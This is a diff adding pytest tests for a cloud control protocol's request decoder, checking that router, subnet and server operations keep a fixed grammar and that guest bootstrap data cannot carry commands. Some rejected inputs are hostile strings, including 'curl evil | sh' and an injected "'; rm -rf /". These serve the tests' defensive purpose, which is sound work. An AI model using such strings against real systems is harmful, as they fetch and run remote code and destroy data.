@@ -224,3 +224,60 @@ def test_limits_show_adds_fixed_absolute_without_exposing_cli_options(tmp_path):
     for flag in ('--absolute', '--rate', '--project'):
         with pytest.raises(control.ProtocolError):
             control.decode(json.dumps(request(['limits', 'show', flag])).encode())
+
+@pytest.mark.parametrize('argv', [
+    ['router', 'set', '--external-gateway', 'net1', 'router1'],
+    ['router', 'add', 'subnet', 'router1', 'subnet1'],
+    ['router', 'remove', 'subnet', 'router1', 'subnet1'],
+    ['server', 'hostkey', 'server1', 'RAILSHOT_HOST_KEY:' + 'a'*64],
+])
+def test_environment_native_operations_have_fixed_grammar(argv):
+    assert control.decode(json.dumps(request(argv)).encode())['params']['argv'] == argv
+
+@pytest.mark.parametrize('argv', [
+    ['router', 'set', '--route', 'destination=0.0.0.0/0,gateway=evil', 'r1'],
+    ['router', 'set', '--external-gateway=net1', 'r1'],
+    ['router', 'add', 'subnet', 'router1', 'subnet1', '--project', 'other'],
+    ['server', 'hostkey', 'server1', 'arbitrary log prefix'],
+])
+def test_new_operations_cannot_expand_general_command_authority(argv):
+    with pytest.raises(control.ProtocolError): control.decode(json.dumps(request(argv)).encode())
+
+
+def test_router_mutation_requires_owned_router_and_subnet(tmp_path):
+    tmp_path.chmod(0o700)
+    class Cloud:
+        calls=[]
+        def run(self, argv, **kwargs):
+            self.calls.append(argv)
+            if argv == ['token','issue']:return {'project_id':'project1','id':'token'}
+            if argv[1]=='show':return {'id':argv[-1],'project_id':'project1'}
+            return None
+    cloud=Cloud()
+    for resource in ('router','subnet'):
+        control.save(tmp_path/'resources.json',{resource+':'+resource+'1':{'target_id':'personal-one','removed':False}})
+        with pytest.raises(control.ProtocolError):
+            control.execute(request(['router','add','subnet','router1','subnet1']),CONFIG,cloud,tmp_path)
+    control.save(tmp_path/'resources.json',{k+':'+k+'1':{'target_id':'personal-one','removed':False} for k in ('router','subnet')})
+    result=control.execute(request(['router','add','subnet','router1','subnet1']),CONFIG,cloud,tmp_path)
+    assert result == {'id':'router1','status':'configured'}
+    assert len([args for args in cloud.calls if args[:2]==['router','add']]) == 1
+
+
+def test_guest_bootstrap_is_typed_and_cannot_supply_a_command():
+    guest={'user':'ubuntu','public_key':'ssh-ed25519 AAAATEST','marker':'RAILSHOT_HOST_KEY:'+'a'*64+' '}
+    assert control.decode(json.dumps(request(['server','create','vm'],guest=guest)).encode())['params']['guest']==guest
+    for altered in ({**guest,'command':'curl evil | sh'}, {**guest,'user':'root'}, {**guest,'marker':"'; rm -rf /"}):
+        with pytest.raises(control.ProtocolError):control.decode(json.dumps(request(['server','create','vm'],guest=altered)).encode())
+
+@pytest.mark.parametrize('action', ['start', 'stop'])
+def test_server_power_requires_exact_owned_resource(tmp_path, action):
+    tmp_path.chmod(0o700)
+    class Cloud:
+        def run(self, argv, **kwargs):
+            if argv == ['token','issue']:return {'project_id':'project1','id':'token'}
+            return {'id':'vm1','project_id':'project1','status':'SHUTOFF' if action=='start' else 'ACTIVE'}
+    with pytest.raises(control.ProtocolError):
+        control.execute(request(['server',action,'vm1']),CONFIG,Cloud(),tmp_path)
+    for argv in (['server',action,'vm1','vm2'], ['server',action,'--all']):
+        with pytest.raises(control.ProtocolError):control.decode(json.dumps(request(argv)).encode())
